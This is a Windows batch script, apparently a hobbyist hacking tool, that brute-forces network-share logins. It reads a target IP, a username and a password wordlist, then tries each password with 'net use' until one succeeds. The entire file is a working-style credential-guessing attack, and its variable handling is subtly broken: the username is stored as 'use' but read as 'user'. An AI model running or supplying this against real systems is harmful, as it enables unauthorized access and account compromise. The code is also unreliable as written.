@echo off
title Bruteforce - by ebola man
color a
echo.
set /p ip="enter ip address: "
set /p use="enter username: "
set /p wordlist="enter password list: "

set /a count=1
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo password not found :<
pause
exit

:success
echo.
echo password found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1 
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

